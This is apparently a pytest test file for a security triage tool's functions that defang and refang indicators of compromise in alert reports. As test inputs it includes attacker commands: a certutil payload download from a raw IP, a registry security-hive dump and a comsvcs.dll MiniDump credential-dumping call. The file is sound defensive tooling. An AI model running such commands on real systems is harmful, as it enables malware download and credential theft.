"""Indicators are shown defanged so GitHub and phones never turn them into clickable links."""

import pytest

from triage.ioc import defang, refang


@pytest.mark.parametrize(
    "raw, shown",
    [
        ("http://www.dvftykdtei.com/ds7002.zip", "hxxp://www[.]dvftykdtei[.]com/ds7002[.]zip"),
        ("https://the_workbench_url", "hxxps://the_workbench_url"),
        ("www.dvftykdtei.com", "www[.]dvftykdtei[.]com"),
        ("jaguartm.onmicrosoft.com", "jaguartm[.]onmicrosoft[.]com"),
        ("185.220.101.45", "185[.]220[.]101[.]45"),
        ("loki@jaguartm.onmicrosoft.com", "loki[@]jaguartm[.]onmicrosoft[.]com"),
        ("Beacon to api.telegram.org every 60s", "Beacon to api[.]telegram[.]org every 60s"),
        ("certutil -urlcache -f http://45.9.1.2/p.exe C:\\p.exe", "certutil -urlcache -f hxxp://45[.]9[.]1[.]2/p[.]exe C:\\p.exe"),
    ],
)
def test_indicators_are_defanged(raw, shown):
    assert defang(raw) == shown


@pytest.mark.parametrize(
    "text",
    [
        "c:\\windows\\system32\\reg.exe save hklm\\security security.hive /y",
        "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump",
        "p(malicious) 0.85 (T1003.002, T1059.001)",
        "VirusTotal: 0 of 98 vendors flag this url as malicious.",
        "e.g. the user",
        "already hxxp://evil[.]com",
        "/usr/bin/python3.11 script.py",
        "arn:aws:iam::111122223333:user/ci-bot",
        "",
    ],
)
def test_ordinary_text_is_unchanged(text):
    assert defang(text) == text


def test_refang_restores_the_original():
    for raw in ["http://www.dvftykdtei.com/ds7002.zip", "185.220.101.45", "loki@jaguartm.onmicrosoft.com"]:
        assert refang(defang(raw)) == raw


def test_report_has_no_clickable_indicators():
    from triage.pipeline import TriageResult
    from triage.report import to_markdown

    r = TriageResult.model_construct(
        alert_id=None, title="Beacon to evil-cdn.top from 185.220.101.45", verdict="needs_human", decided_by="none",
        p_malicious=0.5, p_attacker_active=None, category=None, severity=None, stage=None, rounds=1,
        stop_reason="still unresolved", indicators=[], internal_ips=[], skipped=[], conflicts=[], findings=[],
        analyst_answers=[], leads=["lookup www.evil-cdn.top"], recommended_actions=["Block evil-cdn.top"],
        summary="Download from http://evil-cdn.top/a.ps1 then connection to 185.220.101.45; mail from ceo@evil-cdn.top.",
        jev_requests=1, jev_questions=1, seconds=1, thresholds={},
    )
    md = to_markdown(r)
    for live in ("http://", "https://", "evil-cdn.top", "185.220.101.45", "@evil"):
        assert live not in md, live
    assert "hxxp://evil-cdn[.]top/a[.]ps1" in md and "185[.]220[.]101[.]45" in md
